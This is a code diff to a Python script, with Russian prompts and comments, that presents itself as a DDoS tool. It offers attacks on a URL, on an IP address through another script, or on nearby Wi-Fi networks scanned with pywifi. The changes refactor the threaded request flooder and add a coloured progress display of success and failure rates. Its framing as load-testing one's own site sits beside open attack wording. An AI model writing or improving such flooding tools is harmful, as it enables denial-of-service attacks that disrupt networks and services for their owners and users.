@@ -1,3 +1,4 @@
+from colorama import Fore, Style
 import time
 import pywifi
 import requests
@@ -21,7 +22,7 @@ chose = input("Выберите тип DDoS или сканирование Wi-F
 
 if chose == "1":
     url = input("Введите URL вашего сайта для нагрузочного тестирования: ")
-    port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
+    #port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
     number_of_requests = int(input("Введите количество запросов: "))
 if chose == "2":
     exec(open('DDoSAtack/DDOSAtackIP.py', 'r', encoding='utf-8').read())
@@ -30,9 +31,9 @@ elif chose == "3":
     number_of_requests = int(input("Введите количество запросов для DDoS атаки на выбранную сеть: "))
 
 # Функция для отправки запроса на URL (если выбран сайт)
-def send_request_to_url():
+def send_request_to_url(url):
     try:
-        response = requests.get(f"{url}:{port}")  # Используем указанный порт
+        response = requests.get(url)  # Используем указанный URL
         return response.status_code, response.text
     except requests.exceptions.RequestException as e:
         return None, str(e)
@@ -70,16 +71,34 @@ def find_devices_in_network(bssid):
     return ip_addresses
 
 # Создаем пул потоков для параллельного выполнения запросов
-def generate_traffic(num_requests, target_function, target_ip=None):
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(target_function, target_ip) for _ in range(num_requests)]
-        for future in as_completed(futures):
-            status, result = future.result()
-            if status:
-                print(f'Успешно отправлен запрос с кодом статуса {status}')
-            else:
-                print(f'Ошибка запроса: {result}')
+def generate_traffic(num_requests, target_function, *args):
+    successful_requests = 0
+    failed_requests = 0
+    total_requests = 0
 
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(target_function, *args) for _ in range(num_requests)]
+        
+        for future in as_completed(futures):
+            total_requests += 1
+            
+            status, result = future.result()
+            if status == 200:
+                successful_requests += 1
+            else:
+                failed_requests += 1
+            
+            # Расчёт процентов
+            success_percent = (successful_requests / total_requests) * 100
+            fail_percent = (failed_requests / total_requests) * 100
+            
+            # Очистить строку и обновить прогресс
+            print(f"\r{Fore.YELLOW}Обработано: {total_requests}/{num_requests} "
+                  f"{Fore.GREEN}Успешных: {success_percent:.2f}% "
+                  f"{Fore.RED}Ошибок: {fail_percent:.2f}%{Style.RESET_ALL}", end="")
+
+    # Финальная статистика
+    print(f"\n{Fore.GREEN}Все запросы обработаны.{Style.RESET_ALL}")
 # Запуск DDoS после выбора Wi-Fi сети
 def ddos_wifi_network(network):
     print(f"Начинаем DDoS атаку на сеть {network.ssid} (BSSID: {network.bssid})")
@@ -100,9 +119,10 @@ def ddos_wifi_network(network):
 # Запуск генерации трафика
 if __name__ == "__main__":
     if chose == "1":
-        generate_traffic(number_of_requests, send_request_to_url)
+        generate_traffic(number_of_requests, send_request_to_url, url)
     elif chose == "3":
         networks = scan_wifi_networks()
         network_choice = int(input("Выберите номер сети для атаки: ")) - 1
         selected_network = networks[network_choice]
         ddos_wifi_network(selected_network)
+
